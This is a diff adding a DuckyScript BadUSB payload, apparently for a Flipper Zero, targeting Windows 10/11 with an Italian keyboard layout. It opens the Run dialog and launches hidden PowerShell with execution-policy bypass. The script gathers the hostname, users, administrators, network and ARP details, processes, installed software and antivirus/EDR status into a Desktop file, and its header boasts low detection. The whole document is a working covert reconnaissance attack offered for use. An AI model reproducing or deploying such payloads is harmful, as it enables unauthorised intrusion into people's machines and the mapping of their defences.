@@ -1,0 +1,18 @@
+REM ============================================================
+REM Title:    System Reconnaissance
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Recon
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~8 secondi
+REM Detect:   Basso - comandi nativi Windows
+REM Desc:     Raccoglie info sistema, utenti, processi, software
+REM           installato e le salva in un file sul Desktop
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\recon_'+$env:COMPUTERNAME+'.txt';'=== SYSTEM RECON ===' | Out-File $o;'Date: '+(Get-Date) | Out-File $o -Append;'Hostname: '+$env:COMPUTERNAME | Out-File $o -Append;'User: '+$env:USERNAME | Out-File $o -Append;'Domain: '+$env:USERDOMAIN | Out-File $o -Append;'OS: '+(Get-CimInstance Win32_OperatingSystem).Caption | Out-File $o -Append;'Arch: '+$env:PROCESSOR_ARCHITECTURE | Out-File $o -Append;'`n=== NETWORK ===' | Out-File $o -Append;ipconfig /all | Out-File $o -Append;'`n=== ARP ===' | Out-File $o -Append;arp -a | Out-File $o -Append;'`n=== USERS ===' | Out-File $o -Append;net user | Out-File $o -Append;'`n=== ADMINS ===' | Out-File $o -Append;net localgroup Administrators | Out-File $o -Append;'`n=== PROCESSES ===' | Out-File $o -Append;Get-Process | Select-Object Name,Id,Path | Out-File $o -Append;'`n=== INSTALLED SOFTWARE ===' | Out-File $o -Append;Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion | Out-File $o -Append;'`n=== AV/EDR ===' | Out-File $o -Append;Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | Out-File $o -Append"
+ENTER
